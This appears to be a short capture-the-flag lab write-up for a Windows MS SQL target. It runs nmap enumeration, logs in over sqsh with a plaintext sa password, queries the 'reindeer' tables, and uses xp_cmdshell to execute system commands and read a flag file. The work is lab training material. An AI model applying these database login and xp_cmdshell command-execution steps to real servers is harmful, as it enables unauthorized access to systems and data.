# DAY 11

## Connection
```bash
export IP=10.10.116.71
```

## Enumerate

```bash
nmap -Pn -sC -sV -oN nmap/initial $IP
```
`-Pn` - to skip ping test because we attacking Windows machine.

## MS SQL

port: `1433`

## Connect to DB
`sqsh` usage:

```bash
sqsh -S server -U username -P password
```

### connect with known credentials
```bash
sqsh -S $IP -U sa -P t7uLKzddQzVjVFJp
```

## Getting answers

We know DB name `reindeer` and tables are `names`, `presents`, `schedule`


### reindeer 9 first name

```SQL
1> SELECT * FROM reindeer.dbo.names;
2> go
```

### Check the table schedule
```SQL
1> select * from reindeer.dbo.schedule;
2> go
```

### Check the table presents
```SQL
1> select * from reindeer.dbo.presents;
2> go
```

## Retrieve access
`xp_cmdshell` is enabled! We can use it.

```sh
# syntax
xp_cmdshell 'COMMAND';
```

```sh
xp_cmdshell 'whoami';
```

## Flag

# Search for flag
```bash
1> xp_cmdshell "dir c:\Users";
2> go

[...]

1> xp_cmdshell "dir c:\Users\grinch\Documents";
2> go
```

#### FLAG
```bash
1> xp_cmdshell "type c:\Users\grinch\Documents\flag.txt";
2> go
```
